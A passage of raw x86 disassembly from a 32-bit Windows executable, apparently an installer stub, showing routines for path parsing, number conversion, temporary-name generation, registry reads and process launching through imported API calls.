  405739:	ff 15 f0 81 40 00    	call   *0x4081f0
  40573f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405742:	2b 45 ec             	sub    -0x14(%ebp),%eax
  405745:	53                   	push   %ebx
  405746:	ff 35 b8 b2 47 00    	push   0x47b2b8
  40574c:	53                   	push   %ebx
  40574d:	53                   	push   %ebx
  40574e:	50                   	push   %eax
  40574f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405752:	2b 45 e8             	sub    -0x18(%ebp),%eax
  405755:	50                   	push   %eax
  405756:	ff 75 ec             	push   -0x14(%ebp)
  405759:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40575c:	ff 75 e8             	push   -0x18(%ebp)
  40575f:	68 00 00 00 80       	push   $0x80000000
  405764:	53                   	push   %ebx
  405765:	50                   	push   %eax
  405766:	68 80 00 00 00       	push   $0x80
  40576b:	ff 15 ec 81 40 00    	call   *0x4081ec
  405771:	a3 88 3d 44 00       	mov    %eax,0x443d88
  405776:	53                   	push   %ebx
  405777:	e8 a1 bc ff ff       	call   0x40141d
  40577c:	85 c0                	test   %eax,%eax
  40577e:	74 08                	je     0x405788
  405780:	6a 02                	push   $0x2
  405782:	58                   	pop    %eax
  405783:	e9 c2 00 00 00       	jmp    0x40584a
  405788:	e8 d2 e3 ff ff       	call   0x403b5f
  40578d:	39 1d 80 b3 47 00    	cmp    %ebx,0x47b380
  405793:	0f 85 86 00 00 00    	jne    0x40581f
  405799:	6a 05                	push   $0x5
  40579b:	ff 35 88 3d 44 00    	push   0x443d88
  4057a1:	ff 15 34 82 40 00    	call   *0x408234
  4057a7:	8b 3d d8 80 40 00    	mov    0x4080d8,%edi
  4057ad:	68 80 86 40 00       	push   $0x408680
  4057b2:	ff d7                	call   *%edi
  4057b4:	85 c0                	test   %eax,%eax
  4057b6:	75 07                	jne    0x4057bf
  4057b8:	68 6c 86 40 00       	push   $0x40866c
  4057bd:	ff d7                	call   *%edi
  4057bf:	8b 3d 54 82 40 00    	mov    0x408254,%edi
  4057c5:	56                   	push   %esi
  4057c6:	68 54 86 40 00       	push   $0x408654
  4057cb:	53                   	push   %ebx
  4057cc:	ff d7                	call   *%edi
  4057ce:	85 c0                	test   %eax,%eax
  4057d0:	75 1a                	jne    0x4057ec
  4057d2:	56                   	push   %esi
  4057d3:	68 40 86 40 00       	push   $0x408640
  4057d8:	53                   	push   %ebx
  4057d9:	ff d7                	call   *%edi
  4057db:	56                   	push   %esi
  4057dc:	c7 05 64 32 47 00 54 	movl   $0x408654,0x473264
  4057e3:	86 40 00 
  4057e6:	ff 15 f4 81 40 00    	call   *0x4081f4
  4057ec:	a1 7c 32 47 00       	mov    0x47327c,%eax
  4057f1:	53                   	push   %ebx
  4057f2:	68 a8 50 40 00       	push   $0x4050a8
  4057f7:	83 c0 69             	add    $0x69,%eax
  4057fa:	0f b7 c0             	movzwl %ax,%eax
  4057fd:	53                   	push   %ebx
  4057fe:	50                   	push   %eax
  4057ff:	ff 35 b8 b2 47 00    	push   0x47b2b8
  405805:	ff 15 e4 81 40 00    	call   *0x4081e4
  40580b:	6a 05                	push   $0x5
  40580d:	8b f0                	mov    %eax,%esi
  40580f:	e8 09 bc ff ff       	call   0x40141d
  405814:	6a 01                	push   $0x1
  405816:	e8 38 e1 ff ff       	call   0x403953
  40581b:	8b c6                	mov    %esi,%eax
  40581d:	eb 2b                	jmp    0x40584a
  40581f:	53                   	push   %ebx
  405820:	e8 86 f4 ff ff       	call   0x404cab
  405825:	85 c0                	test   %eax,%eax
  405827:	74 18                	je     0x405841
  405829:	39 1d 74 32 47 00    	cmp    %ebx,0x473274
  40582f:	0f 85 4b ff ff ff    	jne    0x405780
  405835:	6a 02                	push   $0x2
  405837:	e8 e1 bb ff ff       	call   0x40141d
  40583c:	e9 3f ff ff ff       	jmp    0x405780
  405841:	6a 01                	push   $0x1
  405843:	e8 d5 bb ff ff       	call   0x40141d
  405848:	33 c0                	xor    %eax,%eax
  40584a:	5f                   	pop    %edi
  40584b:	5e                   	pop    %esi
  40584c:	5b                   	pop    %ebx
  40584d:	c9                   	leave
  40584e:	c3                   	ret
  40584f:	55                   	push   %ebp
  405850:	8b ec                	mov    %esp,%ebp
  405852:	83 ec 10             	sub    $0x10,%esp
  405855:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405858:	50                   	push   %eax
  405859:	68 e0 fd 45 00       	push   $0x45fde0
  40585e:	33 c0                	xor    %eax,%eax
  405860:	50                   	push   %eax
  405861:	50                   	push   %eax
  405862:	50                   	push   %eax
  405863:	50                   	push   %eax
  405864:	50                   	push   %eax
  405865:	50                   	push   %eax
  405866:	ff 75 08             	push   0x8(%ebp)
  405869:	c7 05 e0 fd 45 00 44 	movl   $0x44,0x45fde0
  405870:	00 00 00 
  405873:	50                   	push   %eax
  405874:	ff 15 dc 80 40 00    	call   *0x4080dc
  40587a:	85 c0                	test   %eax,%eax
  40587c:	74 0c                	je     0x40588a
  40587e:	ff 75 f4             	push   -0xc(%ebp)
  405881:	ff 15 bc 80 40 00    	call   *0x4080bc
  405887:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40588a:	c9                   	leave
  40588b:	c2 04 00             	ret    $0x4
  40588e:	ff 25 f8 81 40 00    	jmp    *0x4081f8
  405894:	68 04 20 00 00       	push   $0x2004
  405899:	ff 74 24 0c          	push   0xc(%esp)
  40589d:	ff 74 24 0c          	push   0xc(%esp)
  4058a1:	ff 35 68 32 47 00    	push   0x473268
  4058a7:	ff 15 fc 81 40 00    	call   *0x4081fc
  4058ad:	c2 08 00             	ret    $0x8
  4058b0:	8b 44 24 08          	mov    0x8(%esp),%eax
  4058b4:	8b c8                	mov    %eax,%ecx
  4058b6:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  4058bc:	83 3d 80 b3 47 00 00 	cmpl   $0x0,0x47b380
  4058c3:	74 07                	je     0x4058cc
  4058c5:	c1 e8 15             	shr    $0x15,%eax
  4058c8:	85 c0                	test   %eax,%eax
  4058ca:	75 47                	jne    0x405913
  4058cc:	83 3d 88 b3 47 00 00 	cmpl   $0x0,0x47b388
  4058d3:	74 06                	je     0x4058db
  4058d5:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  4058db:	a1 b4 b2 47 00       	mov    0x47b2b4,%eax
  4058e0:	a3 34 a0 40 00       	mov    %eax,0x40a034
  4058e5:	a1 b8 b2 47 00       	mov    0x47b2b8,%eax
  4058ea:	a3 38 a0 40 00       	mov    %eax,0x40a038
  4058ef:	8b 44 24 04          	mov    0x4(%esp),%eax
  4058f3:	68 30 a0 40 00       	push   $0x40a030
  4058f8:	a3 3c a0 40 00       	mov    %eax,0x40a03c
  4058fd:	c7 05 40 a0 40 00 a0 	movl   $0x4732a0,0x40a040
  405904:	32 47 00 
  405907:	89 0d 44 a0 40 00    	mov    %ecx,0x40a044
  40590d:	ff 15 00 82 40 00    	call   *0x408200
  405913:	c2 08 00             	ret    $0x8
  405916:	8b 44 24 04          	mov    0x4(%esp),%eax
  40591a:	eb 0e                	jmp    0x40592a
  40591c:	66 3b 4c 24 08       	cmp    0x8(%esp),%cx
  405921:	74 0f                	je     0x405932
  405923:	50                   	push   %eax
  405924:	ff 15 50 82 40 00    	call   *0x408250
  40592a:	0f b7 08             	movzwl (%eax),%ecx
  40592d:	66 85 c9             	test   %cx,%cx
  405930:	75 ea                	jne    0x40591c
  405932:	c2 08 00             	ret    $0x8
  405935:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405939:	0f b7 01             	movzwl (%ecx),%eax
  40593c:	8b d0                	mov    %eax,%edx
  40593e:	83 ca 20             	or     $0x20,%edx
  405941:	0f b7 d2             	movzwl %dx,%edx
  405944:	66 83 f8 5c          	cmp    $0x5c,%ax
  405948:	75 06                	jne    0x405950
  40594a:	66 39 41 02          	cmp    %ax,0x2(%ecx)
  40594e:	74 10                	je     0x405960
  405950:	83 c2 9f             	add    $0xffffff9f,%edx
  405953:	66 83 fa 19          	cmp    $0x19,%dx
  405957:	77 0c                	ja     0x405965
  405959:	66 83 79 02 3a       	cmpw   $0x3a,0x2(%ecx)
  40595e:	75 05                	jne    0x405965
  405960:	33 c0                	xor    %eax,%eax
  405962:	40                   	inc    %eax
  405963:	eb 02                	jmp    0x405967
  405965:	33 c0                	xor    %eax,%eax
  405967:	c2 04 00             	ret    $0x4
  40596a:	53                   	push   %ebx
  40596b:	56                   	push   %esi
  40596c:	8b 35 50 82 40 00    	mov    0x408250,%esi
  405972:	57                   	push   %edi
  405973:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405977:	57                   	push   %edi
  405978:	ff d6                	call   *%esi
  40597a:	8b d8                	mov    %eax,%ebx
  40597c:	53                   	push   %ebx
  40597d:	ff d6                	call   *%esi
  40597f:	0f b7 0f             	movzwl (%edi),%ecx
  405982:	66 85 c9             	test   %cx,%cx
  405985:	74 12                	je     0x405999
  405987:	66 83 3b 3a          	cmpw   $0x3a,(%ebx)
  40598b:	75 0c                	jne    0x405999
  40598d:	66 83 7b 02 5c       	cmpw   $0x5c,0x2(%ebx)
  405992:	75 05                	jne    0x405999
  405994:	50                   	push   %eax
  405995:	ff d6                	call   *%esi
  405997:	eb 28                	jmp    0x4059c1
  405999:	66 83 f9 5c          	cmp    $0x5c,%cx
  40599d:	75 20                	jne    0x4059bf
  40599f:	66 39 4f 02          	cmp    %cx,0x2(%edi)
  4059a3:	75 1a                	jne    0x4059bf
  4059a5:	6a 02                	push   $0x2
  4059a7:	5e                   	pop    %esi
  4059a8:	6a 5c                	push   $0x5c
  4059aa:	50                   	push   %eax
  4059ab:	4e                   	dec    %esi
  4059ac:	e8 65 ff ff ff       	call   0x405916
  4059b1:	66 83 38 00          	cmpw   $0x0,(%eax)
  4059b5:	74 08                	je     0x4059bf
  4059b7:	40                   	inc    %eax
  4059b8:	40                   	inc    %eax
  4059b9:	85 f6                	test   %esi,%esi
  4059bb:	75 eb                	jne    0x4059a8
  4059bd:	eb 02                	jmp    0x4059c1
  4059bf:	33 c0                	xor    %eax,%eax
  4059c1:	5f                   	pop    %edi
  4059c2:	5e                   	pop    %esi
  4059c3:	5b                   	pop    %ebx
  4059c4:	c2 04 00             	ret    $0x4
  4059c7:	55                   	push   %ebp
  4059c8:	8b ec                	mov    %esp,%ebp
  4059ca:	51                   	push   %ecx
  4059cb:	53                   	push   %ebx
  4059cc:	56                   	push   %esi
  4059cd:	57                   	push   %edi
  4059ce:	ff 75 0c             	push   0xc(%ebp)
  4059d1:	8b 3d 4c 81 40 00    	mov    0x40814c,%edi
  4059d7:	ff d7                	call   *%edi
  4059d9:	8b 75 08             	mov    0x8(%ebp),%esi
  4059dc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4059df:	eb 27                	jmp    0x405a08
  4059e1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4059e4:	ff 75 0c             	push   0xc(%ebp)
  4059e7:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  4059ea:	56                   	push   %esi
  4059eb:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  4059ef:	ff 15 e0 80 40 00    	call   *0x4080e0
  4059f5:	85 c0                	test   %eax,%eax
  4059f7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4059fa:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  4059fd:	74 1a                	je     0x405a19
  4059ff:	56                   	push   %esi
  405a00:	ff 15 04 82 40 00    	call   *0x408204
  405a06:	8b f0                	mov    %eax,%esi
  405a08:	56                   	push   %esi
  405a09:	ff d7                	call   *%edi
  405a0b:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  405a0e:	7d d1                	jge    0x4059e1
  405a10:	33 c0                	xor    %eax,%eax
  405a12:	5f                   	pop    %edi
  405a13:	5e                   	pop    %esi
  405a14:	5b                   	pop    %ebx
  405a15:	c9                   	leave
  405a16:	c2 08 00             	ret    $0x8
  405a19:	8b c6                	mov    %esi,%eax
  405a1b:	eb f5                	jmp    0x405a12
  405a1d:	55                   	push   %ebp
  405a1e:	8b ec                	mov    %esp,%ebp
  405a20:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  405a24:	8b 45 08             	mov    0x8(%ebp),%eax
  405a27:	7e 14                	jle    0x405a3d
  405a29:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405a2c:	2b c8                	sub    %eax,%ecx
  405a2e:	8a 14 01             	mov    (%ecx,%eax,1),%dl
  405a31:	ff 4d 10             	decl   0x10(%ebp)
  405a34:	88 10                	mov    %dl,(%eax)
  405a36:	40                   	inc    %eax
  405a37:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  405a3b:	7f f1                	jg     0x405a2e
  405a3d:	5d                   	pop    %ebp
  405a3e:	c2 0c 00             	ret    $0xc
  405a41:	ff 74 24 04          	push   0x4(%esp)
  405a45:	ff 15 7c 80 40 00    	call   *0x40807c
  405a4b:	83 f8 ff             	cmp    $0xffffffff,%eax
  405a4e:	74 0e                	je     0x405a5e
  405a50:	83 e0 fe             	and    $0xfffffffe,%eax
  405a53:	50                   	push   %eax
  405a54:	ff 74 24 08          	push   0x8(%esp)
  405a58:	ff 15 88 80 40 00    	call   *0x408088
  405a5e:	c2 04 00             	ret    $0x4
  405a61:	ff 74 24 04          	push   0x4(%esp)
  405a65:	ff 15 7c 80 40 00    	call   *0x40807c
  405a6b:	8b c8                	mov    %eax,%ecx
  405a6d:	41                   	inc    %ecx
  405a6e:	6a 00                	push   $0x0
  405a70:	f7 d9                	neg    %ecx
  405a72:	1b c9                	sbb    %ecx,%ecx
  405a74:	23 c8                	and    %eax,%ecx
  405a76:	51                   	push   %ecx
  405a77:	ff 74 24 14          	push   0x14(%esp)
  405a7b:	6a 00                	push   $0x0
  405a7d:	6a 01                	push   $0x1
  405a7f:	ff 74 24 1c          	push   0x1c(%esp)
  405a83:	ff 74 24 1c          	push   0x1c(%esp)
  405a87:	ff 15 94 80 40 00    	call   *0x408094
  405a8d:	c2 0c 00             	ret    $0xc
  405a90:	55                   	push   %ebp
  405a91:	8b ec                	mov    %esp,%ebp
  405a93:	51                   	push   %ecx
  405a94:	51                   	push   %ecx
  405a95:	56                   	push   %esi
  405a96:	8b 75 08             	mov    0x8(%ebp),%esi
  405a99:	57                   	push   %edi
  405a9a:	6a 64                	push   $0x64
  405a9c:	5f                   	pop    %edi
  405a9d:	a1 ec 88 40 00       	mov    0x4088ec,%eax
  405aa2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405aa5:	a1 f0 88 40 00       	mov    0x4088f0,%eax
  405aaa:	4f                   	dec    %edi
  405aab:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405aae:	ff 15 90 80 40 00    	call   *0x408090
  405ab4:	6a 1a                	push   $0x1a
  405ab6:	59                   	pop    %ecx
  405ab7:	33 d2                	xor    %edx,%edx
  405ab9:	f7 f1                	div    %ecx
  405abb:	56                   	push   %esi
  405abc:	6a 00                	push   $0x0
  405abe:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405ac1:	50                   	push   %eax
  405ac2:	ff 75 0c             	push   0xc(%ebp)
  405ac5:	66 01 55 fc          	add    %dx,-0x4(%ebp)
  405ac9:	ff 15 e4 80 40 00    	call   *0x4080e4
  405acf:	85 c0                	test   %eax,%eax
  405ad1:	75 0d                	jne    0x405ae0
  405ad3:	85 ff                	test   %edi,%edi
  405ad5:	75 c6                	jne    0x405a9d
  405ad7:	66 89 06             	mov    %ax,(%esi)
  405ada:	5f                   	pop    %edi
  405adb:	5e                   	pop    %esi
  405adc:	c9                   	leave
  405add:	c2 08 00             	ret    $0x8
  405ae0:	8b c6                	mov    %esi,%eax
  405ae2:	eb f6                	jmp    0x405ada
  405ae4:	55                   	push   %ebp
  405ae5:	8b ec                	mov    %esp,%ebp
  405ae7:	56                   	push   %esi
  405ae8:	8b 75 14             	mov    0x14(%ebp),%esi
  405aeb:	33 c0                	xor    %eax,%eax
  405aed:	66 89 06             	mov    %ax,(%esi)
  405af0:	8d 45 18             	lea    0x18(%ebp),%eax
  405af3:	50                   	push   %eax
  405af4:	8b 45 18             	mov    0x18(%ebp),%eax
  405af7:	f7 d8                	neg    %eax
  405af9:	1b c0                	sbb    %eax,%eax
  405afb:	25 00 01 00 00       	and    $0x100,%eax
  405b00:	0d 19 00 02 00       	or     $0x20019,%eax
  405b05:	50                   	push   %eax
  405b06:	6a 00                	push   $0x0
  405b08:	ff 75 0c             	push   0xc(%ebp)
  405b0b:	ff 75 08             	push   0x8(%ebp)
  405b0e:	ff 15 04 80 40 00    	call   *0x408004
  405b14:	85 c0                	test   %eax,%eax
  405b16:	75 45                	jne    0x405b5d
  405b18:	8d 45 0c             	lea    0xc(%ebp),%eax
  405b1b:	50                   	push   %eax
  405b1c:	56                   	push   %esi
  405b1d:	8d 45 14             	lea    0x14(%ebp),%eax
  405b20:	50                   	push   %eax
  405b21:	6a 00                	push   $0x0
  405b23:	ff 75 10             	push   0x10(%ebp)
  405b26:	c7 45 0c 08 40 00 00 	movl   $0x4008,0xc(%ebp)
  405b2d:	ff 75 18             	push   0x18(%ebp)
  405b30:	ff 15 1c 80 40 00    	call   *0x40801c
  405b36:	85 c0                	test   %eax,%eax
  405b38:	75 0c                	jne    0x405b46
  405b3a:	83 7d 14 01          	cmpl   $0x1,0x14(%ebp)
  405b3e:	74 0b                	je     0x405b4b
  405b40:	83 7d 14 02          	cmpl   $0x2,0x14(%ebp)
  405b44:	74 05                	je     0x405b4b
  405b46:	33 c0                	xor    %eax,%eax
  405b48:	66 89 06             	mov    %ax,(%esi)
  405b4b:	ff 75 18             	push   0x18(%ebp)
  405b4e:	33 c0                	xor    %eax,%eax
  405b50:	66 89 86 06 40 00 00 	mov    %ax,0x4006(%esi)
  405b57:	ff 15 08 80 40 00    	call   *0x408008
  405b5d:	5e                   	pop    %esi
  405b5e:	5d                   	pop    %ebp
  405b5f:	c2 14 00             	ret    $0x14
  405b62:	ff 74 24 08          	push   0x8(%esp)
  405b66:	68 34 88 40 00       	push   $0x408834
  405b6b:	ff 74 24 0c          	push   0xc(%esp)
  405b6f:	ff 15 38 82 40 00    	call   *0x408238
  405b75:	83 c4 0c             	add    $0xc,%esp
  405b78:	c2 08 00             	ret    $0x8
  405b7b:	55                   	push   %ebp
  405b7c:	8b ec                	mov    %esp,%ebp
  405b7e:	51                   	push   %ecx
  405b7f:	51                   	push   %ecx
  405b80:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405b83:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405b87:	66 83 39 2d          	cmpw   $0x2d,(%ecx)
  405b8b:	53                   	push   %ebx
  405b8c:	56                   	push   %esi
  405b8d:	6a 0a                	push   $0xa
  405b8f:	58                   	pop    %eax
  405b90:	6a 39                	push   $0x39
  405b92:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  405b99:	5b                   	pop    %ebx
  405b9a:	75 06                	jne    0x405ba2
  405b9c:	41                   	inc    %ecx
  405b9d:	41                   	inc    %ecx
  405b9e:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  405ba2:	66 83 39 30          	cmpw   $0x30,(%ecx)
  405ba6:	75 27                	jne    0x405bcf
  405ba8:	41                   	inc    %ecx
  405ba9:	41                   	inc    %ecx
  405baa:	0f b7 11             	movzwl (%ecx),%edx
  405bad:	66 83 fa 30          	cmp    $0x30,%dx
  405bb1:	72 0c                	jb     0x405bbf
  405bb3:	66 83 fa 37          	cmp    $0x37,%dx
  405bb7:	77 06                	ja     0x405bbf
  405bb9:	6a 08                	push   $0x8
  405bbb:	58                   	pop    %eax
  405bbc:	6a 37                	push   $0x37
  405bbe:	5b                   	pop    %ebx
  405bbf:	0f b7 d2             	movzwl %dx,%edx
  405bc2:	83 e2 df             	and    $0xffffffdf,%edx
  405bc5:	83 fa 58             	cmp    $0x58,%edx
  405bc8:	75 05                	jne    0x405bcf
  405bca:	6a 10                	push   $0x10
  405bcc:	41                   	inc    %ecx
  405bcd:	58                   	pop    %eax
  405bce:	41                   	inc    %ecx
  405bcf:	0f b7 11             	movzwl (%ecx),%edx
  405bd2:	41                   	inc    %ecx
  405bd3:	41                   	inc    %ecx
  405bd4:	83 fa 30             	cmp    $0x30,%edx
  405bd7:	7c 0c                	jl     0x405be5
  405bd9:	0f b7 f3             	movzwl %bx,%esi
  405bdc:	3b d6                	cmp    %esi,%edx
  405bde:	7f 05                	jg     0x405be5
  405be0:	83 ea 30             	sub    $0x30,%edx
  405be3:	eb 1b                	jmp    0x405c00
  405be5:	66 83 f8 10          	cmp    $0x10,%ax
  405be9:	75 23                	jne    0x405c0e
  405beb:	8b f2                	mov    %edx,%esi
  405bed:	83 e6 df             	and    $0xffffffdf,%esi
  405bf0:	83 fe 41             	cmp    $0x41,%esi
  405bf3:	7c 19                	jl     0x405c0e
  405bf5:	83 fe 46             	cmp    $0x46,%esi
  405bf8:	7f 14                	jg     0x405c0e
  405bfa:	83 e2 07             	and    $0x7,%edx
  405bfd:	83 c2 09             	add    $0x9,%edx
  405c00:	0f b7 f0             	movzwl %ax,%esi
  405c03:	0f af 75 fc          	imul   -0x4(%ebp),%esi
  405c07:	03 f2                	add    %edx,%esi
  405c09:	89 75 fc             	mov    %esi,-0x4(%ebp)
  405c0c:	eb c1                	jmp    0x405bcf
  405c0e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405c11:	0f af 45 fc          	imul   -0x4(%ebp),%eax
  405c15:	5e                   	pop    %esi
  405c16:	5b                   	pop    %ebx
  405c17:	c9                   	leave
  405c18:	c2 04 00             	ret    $0x4
  405c1b:	68 04 20 00 00       	push   $0x2004
  405c20:	ff 74 24 0c          	push   0xc(%esp)
  405c24:	ff 74 24 0c          	push   0xc(%esp)
  405c28:	ff 15 c4 80 40 00    	call   *0x4080c4
  405c2e:	c2 08 00             	ret    $0x8
  405c31:	ff 25 c0 80 40 00    	jmp    *0x4080c0
  405c37:	ff 25 e8 80 40 00    	jmp    *0x4080e8
  405c3d:	0f b7 44 24 04       	movzwl 0x4(%esp),%eax
  405c42:	50                   	push   %eax
  405c43:	ff 15 08 82 40 00    	call   *0x408208
  405c49:	c3                   	ret
  405c4a:	55                   	push   %ebp
  405c4b:	56                   	push   %esi
  405c4c:	8b 74 24 0c          	mov    0xc(%esp),%esi
  405c50:	66 83 3e 5c          	cmpw   $0x5c,(%esi)
  405c54:	57                   	push   %edi
  405c55:	75 18                	jne    0x405c6f
  405c57:	66 83 7e 02 5c       	cmpw   $0x5c,0x2(%esi)
  405c5c:	75 11                	jne    0x405c6f
  405c5e:	66 83 7e 04 3f       	cmpw   $0x3f,0x4(%esi)
  405c63:	75 0a                	jne    0x405c6f
  405c65:	66 83 7e 06 5c       	cmpw   $0x5c,0x6(%esi)
  405c6a:	75 03                	jne    0x405c6f
  405c6c:	83 c6 08             	add    $0x8,%esi
  405c6f:	66 83 3e 00          	cmpw   $0x0,(%esi)
  405c73:	74 0d                	je     0x405c82
  405c75:	56                   	push   %esi
  405c76:	e8 ba fc ff ff       	call   0x405935
  405c7b:	85 c0                	test   %eax,%eax
  405c7d:	74 03                	je     0x405c82
  405c7f:	83 c6 04             	add    $0x4,%esi
  405c82:	0f b7 06             	movzwl (%esi),%eax
  405c85:	8b ee                	mov    %esi,%ebp
  405c87:	8b fe                	mov    %esi,%edi
  405c89:	66 85 c0             	test   %ax,%ax
  405c8c:	74 40                	je     0x405cce
  405c8e:	53                   	push   %ebx
  405c8f:	8b 1d 50 82 40 00    	mov    0x408250,%ebx
  405c95:	66 83 f8 1f          	cmp    $0x1f,%ax
  405c99:	76 25                	jbe    0x405cc0
  405c9b:	50                   	push   %eax
  405c9c:	68 f4 88 40 00       	push   $0x4088f4
  405ca1:	e8 70 fc ff ff       	call   0x405916
  405ca6:	66 83 38 00          	cmpw   $0x0,(%eax)
  405caa:	75 14                	jne    0x405cc0
  405cac:	56                   	push   %esi
  405cad:	ff d3                	call   *%ebx
  405caf:	2b c6                	sub    %esi,%eax
  405cb1:	d1 f8                	sar    $1,%eax
  405cb3:	50                   	push   %eax
  405cb4:	56                   	push   %esi
  405cb5:	57                   	push   %edi
  405cb6:	e8 62 fd ff ff       	call   0x405a1d
  405cbb:	57                   	push   %edi
  405cbc:	ff d3                	call   *%ebx
  405cbe:	8b f8                	mov    %eax,%edi
  405cc0:	56                   	push   %esi
  405cc1:	ff d3                	call   *%ebx
  405cc3:	8b f0                	mov    %eax,%esi
  405cc5:	0f b7 06             	movzwl (%esi),%eax
  405cc8:	66 85 c0             	test   %ax,%ax
  405ccb:	75 c8                	jne    0x405c95
  405ccd:	5b                   	pop    %ebx
  405cce:	33 c0                	xor    %eax,%eax
  405cd0:	66 89 07             	mov    %ax,(%edi)
  405cd3:	57                   	push   %edi
  405cd4:	55                   	push   %ebp
  405cd5:	ff 15 0c 82 40 00    	call   *0x40820c
  405cdb:	8b f8                	mov    %eax,%edi
  405cdd:	0f b7 07             	movzwl (%edi),%eax
  405ce0:	66 83 f8 20          	cmp    $0x20,%ax
  405ce4:	74 06                	je     0x405cec
  405ce6:	66 83 f8 5c          	cmp    $0x5c,%ax
  405cea:	75 09                	jne    0x405cf5
  405cec:	33 c0                	xor    %eax,%eax
  405cee:	66 89 07             	mov    %ax,(%edi)
  405cf1:	3b ef                	cmp    %edi,%ebp
  405cf3:	72 de                	jb     0x405cd3
  405cf5:	5f                   	pop    %edi
  405cf6:	5e                   	pop    %esi
  405cf7:	5d                   	pop    %ebp
  405cf8:	c2 04 00             	ret    $0x4
  405cfb:	56                   	push   %esi
  405cfc:	be 30 4a 46 00       	mov    $0x464a30,%esi
  405d01:	56                   	push   %esi
  405d02:	ff 74 24 0c          	push   0xc(%esp)
  405d06:	ff 15 68 81 40 00    	call   *0x408168
  405d0c:	83 f8 ff             	cmp    $0xffffffff,%eax
  405d0f:	74 0b                	je     0x405d1c
  405d11:	50                   	push   %eax
  405d12:	ff 15 60 81 40 00    	call   *0x408160
  405d18:	8b c6                	mov    %esi,%eax
  405d1a:	eb 02                	jmp    0x405d1e
  405d1c:	33 c0                	xor    %eax,%eax
  405d1e:	5e                   	pop    %esi
  405d1f:	c2 04 00             	ret    $0x4
  405d22:	56                   	push   %esi
  405d23:	8b 74 24 08          	mov    0x8(%esp),%esi
  405d27:	57                   	push   %edi
  405d28:	c1 e6 03             	shl    $0x3,%esi
  405d2b:	8b be 58 a0 40 00    	mov    0x40a058(%esi),%edi
  405d31:	57                   	push   %edi
  405d32:	ff 15 f4 80 40 00    	call   *0x4080f4
  405d38:	85 c0                	test   %eax,%eax
  405d3a:	75 0b                	jne    0x405d47
  405d3c:	57                   	push   %edi
  405d3d:	ff 15 f0 80 40 00    	call   *0x4080f0
  405d43:	85 c0                	test   %eax,%eax
  405d45:	74 0d                	je     0x405d54
  405d47:	ff b6 5c a0 40 00    	push   0x40a05c(%esi)
  405d4d:	50                   	push   %eax
  405d4e:	ff 15 ec 80 40 00    	call   *0x4080ec
  405d54:	5f                   	pop    %edi
  405d55:	5e                   	pop    %esi
  405d56:	c2 04 00             	ret    $0x4
  405d59:	55                   	push   %ebp
  405d5a:	8b ec                	mov    %esp,%ebp
  405d5c:	83 ec 1c             	sub    $0x1c,%esp
  405d5f:	56                   	push   %esi
  405d60:	8b 75 08             	mov    0x8(%ebp),%esi
  405d63:	57                   	push   %edi
  405d64:	8b 3d 14 82 40 00    	mov    0x408214,%edi
  405d6a:	eb 0a                	jmp    0x405d76
  405d6c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405d6f:	50                   	push   %eax
  405d70:	ff 15 10 82 40 00    	call   *0x408210
  405d76:	6a 01                	push   $0x1
  405d78:	56                   	push   %esi
  405d79:	56                   	push   %esi
  405d7a:	6a 00                	push   $0x0
  405d7c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405d7f:	50                   	push   %eax
  405d80:	ff d7                	call   *%edi
  405d82:	85 c0                	test   %eax,%eax
  405d84:	75 e6                	jne    0x405d6c
  405d86:	5f                   	pop    %edi
  405d87:	5e                   	pop    %esi
  405d88:	c9                   	leave
  405d89:	c2 04 00             	ret    $0x4
  405d8c:	53                   	push   %ebx
  405d8d:	56                   	push   %esi
  405d8e:	57                   	push   %edi
  405d8f:	be 04 20 00 00       	mov    $0x2004,%esi
  405d94:	56                   	push   %esi
  405d95:	6a 40                	push   $0x40
  405d97:	ff 15 20 81 40 00    	call   *0x408120
  405d9d:	33 ff                	xor    %edi,%edi
  405d9f:	57                   	push   %edi
  405da0:	57                   	push   %edi
  405da1:	56                   	push   %esi
  405da2:	8b d8                	mov    %eax,%ebx
  405da4:	53                   	push   %ebx
  405da5:	6a ff                	push   $0xffffffff
  405da7:	ff 74 24 28          	push   0x28(%esp)
  405dab:	57                   	push   %edi
  405dac:	57                   	push   %edi
  405dad:	ff 15 44 81 40 00    	call   *0x408144
  405db3:	85 c0                	test   %eax,%eax
  405db5:	74 0d                	je     0x405dc4
  405db7:	53                   	push   %ebx
  405db8:	ff 74 24 14          	push   0x14(%esp)
  405dbc:	ff 15 ec 80 40 00    	call   *0x4080ec
  405dc2:	8b f8                	mov    %eax,%edi
  405dc4:	53                   	push   %ebx
  405dc5:	ff 15 2c 81 40 00    	call   *0x40812c
  405dcb:	8b c7                	mov    %edi,%eax
  405dcd:	5f                   	pop    %edi
  405dce:	5e                   	pop    %esi
  405dcf:	5b                   	pop    %ebx
  405dd0:	c2 08 00             	ret    $0x8
  405dd3:	55                   	push   %ebp
  405dd4:	8b ec                	mov    %esp,%ebp
  405dd6:	81 ec 98 0b 00 00    	sub    $0xb98,%esp
  405ddc:	53                   	push   %ebx
  405ddd:	56                   	push   %esi
  405dde:	57                   	push   %edi
